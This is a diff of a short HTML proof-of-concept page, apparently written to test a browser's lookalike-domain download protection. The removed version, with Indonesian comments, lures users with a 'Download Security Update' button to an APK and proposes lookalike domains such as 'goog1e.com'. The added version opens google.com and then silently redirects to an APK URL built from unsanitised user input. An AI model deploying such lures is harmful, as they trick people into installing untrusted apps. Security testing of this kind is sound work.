@@ -1,31 +1,36 @@
-<!DOCTYPE html>
 <html>
-<head>
-    <meta charset="UTF-8">
-    <title>Download PoC</title>
-</head>
-<body>
-    <h2>Security Update</h2>
-    
-    <!-- 
-    INTI: Arahkan ke URL dengan domain yang menyerupai 
-    domain legitimate (lookalike), lalu picu download.
-    
-    Contoh: "goog1e.com" bukan "google.com"
-    Download akan memicu net::ERR_ABORTED,
-    Lookalike throttle akan PROCEED.
-    -->
-    
-    <a href="https://github.com/RezaAS14/test/test.apk" 
-       download="test.apk"
-       style="display:inline-block; padding:15px 30px; background:#0066cc; color:white; text-decoration:none; border-radius:5px;">
-        Download Security Update
-    </a>
-    
-    <!-- Atau menggunakan form yang memicu download -->
-    <form action="https://github.com/RezaAS14/test/test.apk" method="GET">
-        <button type="submit">Download</button>
-    </form>
-    
-</body>
+ <head> 
+  <meta charset="utf-8">
+  <style>
+  .button {
+    background-color: #4CAF50;
+    border: none;
+    color: white;
+    padding: 15px 32px;
+    text-align: center;
+    text-decoration: none;
+    display: inline-block;
+    font-size: 16px;
+    margin: 4px 2px;
+    cursor: pointer;
+  }
+  </style>
+ </head> 
+ <body> 
+  <script>
+  function a(userInput){
+    // This is a very basic example and should not be used in production
+    // as it's vulnerable to XSS attacks
+    var newWindow = window.open('https://google.com', 'x');
+    setTimeout(function(){
+      var url = 'https://github.com/RezaAS14' + userInput + '.apk';
+      newWindow.location = url;
+    }, 5000);
+  }
+  </script> 
+  <center>
+  <input type="text" id="userInput" placeholder="Enter your input">
+  <input type="button" class="button" value="Download From Original Site" onclick="a(document.getElementById('userInput').value)">
+  </center>
+ </body>
 </html>
